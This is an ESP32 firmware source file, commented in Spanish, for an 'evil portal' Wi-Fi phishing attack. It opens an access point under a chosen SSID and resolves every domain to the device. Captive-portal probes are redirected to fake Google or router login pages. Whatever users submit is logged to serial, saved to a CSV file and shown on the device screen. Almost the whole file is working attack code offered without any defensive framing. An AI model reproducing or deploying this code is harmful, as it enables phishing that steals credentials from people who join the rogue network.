#include "wifi_portal_task.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "config/constants.h"
#include "config/portal_templates.h"
#include "utils/file_utils.h"

// --- Instancias únicas (solo hay un portal a la vez). Se registran las rutas
// una sola vez; los handlers leen el estado de fichero-scope, que se refresca
// en cada arranque. ---
static WebServer webServer(80);
static DNSServer dnsServer;
static const byte DNS_PORT = 53;

TaskHandle_t portalTaskHandle = NULL;

// Estado compartido con ui_task (protegido por mutex salvo el contador atómico).
static SemaphoreHandle_t portalMutex = NULL;
static volatile uint32_t s_capturedCount = 0;
static char s_lastCred[160] = {0};
static char s_apIp[16] = {0};
static char s_ssid[33] = {0};
static volatile uint8_t s_templateId = TPL_GOOGLE;

// Log por serial de los eventos del AP: permite distinguir si el cliente llega
// a asociarse (STACONNECTED) y si el DHCP le entrega IP (STAIPASSIGNED).
static void onPortalWiFiEvent(WiFiEvent_t event, WiFiEventInfo_t info) {
    (void) info;
    switch (event) {
        case ARDUINO_EVENT_WIFI_AP_START:           Serial.println("[PORTAL] evt AP_START"); break;
        case ARDUINO_EVENT_WIFI_AP_STACONNECTED:    Serial.println("[PORTAL] evt STA associated"); break;
        case ARDUINO_EVENT_WIFI_AP_STAIPASSIGNED:   Serial.println("[PORTAL] evt STA got IP (DHCP OK)"); break;
        case ARDUINO_EVENT_WIFI_AP_STADISCONNECTED: Serial.println("[PORTAL] evt STA left"); break;
        default: break;
    }
}

// Convierte un SSID en un nombre de fichero seguro para LittleFS.
static String sanitizeFilename(const String &in) {
    String out = "";
    for (size_t i = 0; i < in.length(); i++) {
        char c = in[i];
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' ||
            c == '_')
            out += c;
        else out += '_';
    }
    if (out.isEmpty()) out = "creds";
    return out;
}

// GET "/": sirve la plantilla seleccionada.
static void handleRoot() {
    Serial.println("[PORTAL] GET / host=" + webServer.hostHeader());
    if (s_templateId == TPL_ROUTER) webServer.send_P(200, "text/html", PORTAL_HTML_ROUTER);
    else webServer.send_P(200, "text/html", PORTAL_HTML_GOOGLE);
}

// Captura los campos del formulario, los persiste y actualiza el estado de UI.
static void handleCreds() {
    String csvLine = "";
    String display = "";
    bool any = false;

    for (int i = 0; i < webServer.args(); i++) {
        String key = webServer.argName(i);
        if (key == "plain") continue; // cuerpo crudo del POST
        String val = webServer.arg(i);
        if (any) csvLine += ",";
        csvLine += key + ": " + val;
        display += key + ": " + val + "\n";
        any = true;
    }

    if (any) {
        String fname = sanitizeFilename(String(s_ssid)) + "_creds.csv";
        FileUtils::appendLine(EVIL_PORTAL_PATH, fname, csvLine);

        if (portalMutex) xSemaphoreTake(portalMutex, portMAX_DELAY);
        s_capturedCount++;
        strncpy(s_lastCred, display.c_str(), sizeof(s_lastCred) - 1);
        s_lastCred[sizeof(s_lastCred) - 1] = '\0';
        if (portalMutex) xSemaphoreGive(portalMutex);

        Serial.println("[PORTAL] Captured -> " + csvLine);
    }

    webServer.send_P(200, "text/html", PORTAL_HTML_SUCCESS);
}

// Cualquier otra URL: si trae argumentos es un envío de formulario; si no, es
// una sonda de captive-portal (generate_204, hotspot-detect...) -> redirige al
// portal para forzar que el sistema operativo abra la pantalla de login.
static void handleNotFound() {
    if (webServer.args() > 0) {
        handleCreds();
        return;
    }
    // Log de la sonda: si aquí aparecen generate_204 / hotspot-detect.html /
    // ncsi.txt es que el DNS funciona y la petición llega; si nunca aparecen al
    // conectarse, el cliente no está usando la ESP como DNS.
    Serial.println("[PORTAL] probe host=" + webServer.hostHeader() + " uri=" + webServer.uri() + " -> 302");
    webServer.sendHeader("Location", String("http://") + s_apIp + "/", true);
    webServer.send(302, "text/plain", "");
}

static void setupPortalRoutes() {
    webServer.on("/", handleRoot);
    webServer.on("/post", handleCreds);
    webServer.onNotFound(handleNotFound);
}

static void wifi_portal_task(void *pv) {
    PortalTaskParams *params = (PortalTaskParams *) pv;

    // Copiar config a estado compartido antes de que UI pueda leerlo.
    if (portalMutex) xSemaphoreTake(portalMutex, portMAX_DELAY);
    strncpy(s_ssid, params->ssid, sizeof(s_ssid) - 1);
    s_ssid[sizeof(s_ssid) - 1] = '\0';
    s_templateId = params->templateId;
    s_capturedCount = 0;
    s_lastCred[0] = '\0';
    s_apIp[0] = '\0';
    if (portalMutex) xSemaphoreGive(portalMutex);

    uint8_t channel = params->channel ? params->channel : 1;
    free(params); // ownership cedido a la tarea (igual que RadioTaskParams)

    // Registrar el log de eventos del AP una sola vez.
    static bool eventsRegistered = false;
    if (!eventsRegistered) {
        WiFi.onEvent(onPortalWiFiEvent);
        eventsRegistered = true;
    }

    // AP abierto. Orden mode -> softAP (levanta netif + DHCP) -> softAPConfig
    // (reasigna IP/gateway y reinicia el DHCP con el AP ya arrancado). Los delays
    // dejan que el evento AP_START ocurra antes de reconfigurar, lo que evita el
    // clásico "obteniendo IP..." infinito.
    WiFi.persistent(false);
    WiFi.mode(WIFI_AP);
    vTaskDelay(100 / portTICK_PERIOD_MS);

    bool apOk = WiFi.softAP(s_ssid, (const char *) NULL, channel);
    vTaskDelay(100 / portTICK_PERIOD_MS);

    IPAddress gw(172, 0, 0, 1);
    bool cfgOk = WiFi.softAPConfig(gw, gw, IPAddress(255, 255, 255, 0));
    vTaskDelay(300 / portTICK_PERIOD_MS);

    IPAddress apip = WiFi.softAPIP();
    Serial.printf("[PORTAL] softAP('%s' ch%u)=%d softAPConfig=%d ip=%s\n", s_ssid, channel, apOk, cfgOk,
                  apip.toString().c_str());

    String ip = apip.toString();
    if (portalMutex) xSemaphoreTake(portalMutex, portMAX_DELAY);
    strncpy(s_apIp, ip.c_str(), sizeof(s_apIp) - 1);
    s_apIp[sizeof(s_apIp) - 1] = '\0';
    if (portalMutex) xSemaphoreGive(portalMutex);

    // DNS wildcard: todo dominio resuelve al AP.
    dnsServer.start(DNS_PORT, "*", apip);

    // Las rutas se registran una única vez (los handlers leen estado global).
    static bool routesInit = false;
    if (!routesInit) {
        setupPortalRoutes();
        routesInit = true;
    }
    webServer.begin();

    uint32_t note;
    while (true) {
        if (xTaskNotifyWait(0, 0, &note, 0) == pdTRUE && note == PORTAL_STOP) break;
        dnsServer.processNextRequest();
        webServer.handleClient();
        vTaskDelay(2 / portTICK_PERIOD_MS); // cede CPU a ui_task
    }

    // Desmontaje.
    webServer.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);

    portalTaskHandle = NULL;
    vTaskDelete(NULL);
}

bool startPortalTask(const String &ssid, uint8_t channel, uint8_t templateId) {
    if (portalTaskHandle != NULL) return false; // ya hay un portal vivo
    if (!portalMutex) portalMutex = xSemaphoreCreateMutex();

    PortalTaskParams *p = (PortalTaskParams *) malloc(sizeof(PortalTaskParams));
    if (!p) return false;
    strncpy(p->ssid, ssid.c_str(), sizeof(p->ssid) - 1);
    p->ssid[sizeof(p->ssid) - 1] = '\0';
    p->channel = channel;
    p->templateId = templateId;

    BaseType_t ok =
        xTaskCreatePinnedToCore(wifi_portal_task, "wifi_portal_task", 8192, p, 1, &portalTaskHandle, 0);
    if (ok != pdPASS) {
        free(p);
        portalTaskHandle = NULL;
        return false;
    }
    return true;
}

void stopPortalTask() {
    if (portalTaskHandle == NULL) return;
    xTaskNotify(portalTaskHandle, PORTAL_STOP, eSetValueWithOverwrite);
    // Espera acotada a que el worker termine el desmontaje (WiFi/DNS/web).
    for (int i = 0; i < 50 && portalTaskHandle != NULL; i++) vTaskDelay(10 / portTICK_PERIOD_MS);
}

uint32_t portalGetCapturedCount() { return s_capturedCount; }

void portalGetLastCred(char *buf, size_t len) {
    if (!len) return;
    if (!portalMutex) {
        buf[0] = '\0';
        return;
    }
    xSemaphoreTake(portalMutex, portMAX_DELAY);
    strncpy(buf, s_lastCred, len - 1);
    buf[len - 1] = '\0';
    xSemaphoreGive(portalMutex);
}

void portalGetApIp(char *buf, size_t len) {
    if (!len) return;
    if (!portalMutex) {
        buf[0] = '\0';
        return;
    }
    xSemaphoreTake(portalMutex, portMAX_DELAY);
    strncpy(buf, s_apIp, len - 1);
    buf[len - 1] = '\0';
    xSemaphoreGive(portalMutex);
}
